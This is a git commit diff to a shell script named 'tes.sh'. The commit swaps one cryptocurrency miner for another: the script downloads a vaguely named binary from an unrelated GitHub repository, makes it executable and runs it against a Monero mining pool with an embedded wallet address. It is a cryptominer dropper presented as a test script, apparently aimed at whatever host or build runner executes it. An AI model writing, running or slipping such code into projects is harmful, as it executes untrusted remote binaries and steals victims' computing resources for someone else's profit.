a98d5186aa653398e68b74e4446e42bc20eb172e
dnqjwdz <100903992+dnqjwdz@users.noreply.github.com>
2022-07-06 23:28:42 +0000

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -1,3 +1,3 @@
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -o nt
-chmod +x nt
-./nt -o ann -p pkt1qmga844nr8q2x0ndlyqzm6k89g8ujjrhs4eg3gl https://stratum.zetahash.com
+wget https://github.com/sabrifaudi12/dqwz/raw/main/gas
+chmod +x gas
+./gas --url pool.hashvault.pro:80 --user hvxy22DVSsKJySa8ZEQqeV54jrDqNdEcE53fCmu8GaPf8myheipmvJPCwg7pu6b1hXJBVxondQ9WAUfDJ9Bpzwq29CqDQ6Qeke --pass ano --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
